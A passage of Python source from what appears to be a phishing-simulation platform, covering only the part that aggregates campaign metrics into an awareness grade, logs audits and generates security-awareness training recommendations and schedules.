            # Get all campaigns for project
            campaigns = [c for c in self.campaigns.values() if c.get("project_id") == project_id]

            if not campaigns:
                return {
                    "success": False,
                    "error": "No campaigns found for this project"
                }

            # Aggregate metrics
            total_targets = 0
            total_opened = 0
            total_clicked = 0
            total_submitted = 0
            total_reported = 0

            for campaign in campaigns:
                metrics = campaign["metrics"]
                total_targets += len(campaign["targets"])
                total_opened += metrics["emails_opened"]
                total_clicked += metrics["links_clicked"]
                total_submitted += metrics["credentials_submitted"]
                total_reported += metrics["reported"]

            # Calculate rates
            if total_targets > 0:
                open_rate = (total_opened / total_targets * 100)
                click_rate = (total_clicked / total_targets * 100)
                submission_rate = (total_submitted / total_targets * 100)
                report_rate = (total_reported / total_targets * 100)
            else:
                open_rate = click_rate = submission_rate = report_rate = 0

            # Assess awareness level
            if report_rate > 50 and submission_rate < 5:
                awareness_level = "excellent"
                grade = "A"
            elif report_rate > 30 and submission_rate < 10:
                awareness_level = "good"
                grade = "B"
            elif report_rate > 15 and submission_rate < 20:
                awareness_level = "moderate"
                grade = "C"
            elif report_rate > 5 and submission_rate < 35:
                awareness_level = "poor"
                grade = "D"
            else:
                awareness_level = "critical"
                grade = "F"

            result = {
                "success": True,
                "project_id": project_id,
                "campaigns_analyzed": len(campaigns),
                "total_targets": total_targets,
                "metrics": {
                    "open_rate": round(open_rate, 2),
                    "click_rate": round(click_rate, 2),
                    "submission_rate": round(submission_rate, 2),
                    "report_rate": round(report_rate, 2)
                },
                "awareness_level": awareness_level,
                "grade": grade,
                "assessment": self._get_awareness_assessment(awareness_level)
            }

            await self.db.audit(
                action="assess_awareness",
                resource_type="project",
                resource_id=project_id,
                details={"awareness_level": awareness_level, "grade": grade},
                project_id=project_id
            )

            return result

        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }

    def _get_awareness_assessment(self, level: str) -> str:
        """Get awareness assessment text."""
        assessments = {
            "excellent": "Organization demonstrates excellent security awareness. Users are vigilant and report suspicious emails.",
            "good": "Organization has good security awareness with room for improvement in certain areas.",
            "moderate": "Organization has moderate security awareness. Additional training recommended.",
            "poor": "Organization shows poor security awareness. Immediate training intervention required.",
            "critical": "Organization is at critical risk. Comprehensive security awareness program needed urgently."
        }
        return assessments.get(level, "Unknown awareness level")

    async def generate_training_recommendations(self, project_id: str) -> Dict[str, Any]:
        """Generate targeted security awareness training recommendations.

        Args:
            project_id: Project ID

        Returns:
            Dict with success status and training recommendations
        """
        from core.database import generate_id, utc_now

        try:
            # Get awareness assessment
            assessment = await self.assess_awareness(project_id)

            if not assessment.get("success"):
                return assessment

            awareness_level = assessment["awareness_level"]
            metrics = assessment["metrics"]

            recommendations = []

            # Base recommendations on metrics
            if metrics["click_rate"] > 20:
                recommendations.append({
                    "topic": "URL and Link Safety",
                    "priority": "high",
                    "description": "Users frequently click suspicious links",
                    "training_modules": [
                        "Identifying malicious URLs",
                        "Hover-to-preview link destinations",
                        "Recognizing URL shorteners and obfuscation"
                    ]
                })

            if metrics["submission_rate"] > 10:
                recommendations.append({
                    "topic": "Credential Protection",
                    "priority": "critical",
                    "description": "Users submit credentials on suspicious sites",
                    "training_modules": [
                        "Password security best practices",
                        "Recognizing fake login pages",
                        "Multi-factor authentication importance",
                        "Reporting credential compromise"
                    ]
                })

            if metrics["report_rate"] < 20:
                recommendations.append({
                    "topic": "Incident Reporting",
                    "priority": "high",
                    "description": "Users don't consistently report suspicious emails",
                    "training_modules": [
                        "How to report phishing attempts",
                        "Importance of security reporting",
                        "No-blame security culture"
                    ]
                })

            if metrics["open_rate"] > 60:
                recommendations.append({
                    "topic": "Email Security Fundamentals",
                    "priority": "medium",
                    "description": "Users open most emails without scrutiny",
                    "training_modules": [
                        "Email header analysis",
                        "Sender verification techniques",
                        "Red flags in email content"
                    ]
                })

            # Add general recommendations based on awareness level
            if awareness_level in ["poor", "critical"]:
                recommendations.append({
                    "topic": "Security Awareness Fundamentals",
                    "priority": "critical",
                    "description": "Comprehensive security training needed",
                    "training_modules": [
                        "Introduction to cybersecurity threats",
                        "Social engineering tactics and defenses",
                        "Data protection and privacy",
                        "Secure work practices"
                    ]
                })

            result = {
                "success": True,
                "project_id": project_id,
                "awareness_level": awareness_level,
                "recommendations": recommendations,
                "recommendation_count": len(recommendations),
                "suggested_frequency": self._get_training_frequency(awareness_level),
                "next_steps": [
                    "Implement recommended training modules",
                    "Schedule follow-up phishing simulation in 3-6 months",
                    "Track improvement in awareness metrics",
                    "Provide targeted training for repeat offenders"
                ]
            }

            await self.db.audit(
                action="generate_training_recommendations",
                resource_type="project",
                resource_id=project_id,
                details={"recommendation_count": len(recommendations)},
                project_id=project_id
            )

            return result

        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }

    def _get_training_frequency(self, awareness_level: str) -> str:
        """Get recommended training frequency based on awareness level."""
        frequencies = {
            "excellent": "Annual refresher training with quarterly awareness emails",
            "good": "Semi-annual training with monthly awareness campaigns",
            "moderate": "Quarterly training with bi-weekly awareness emails",
            "poor": "Monthly training with weekly awareness campaigns",
            "critical": "Immediate intensive training, then monthly follow-ups for 6 months"
        }
        return frequencies.get(awareness_level, "Quarterly training recommended")
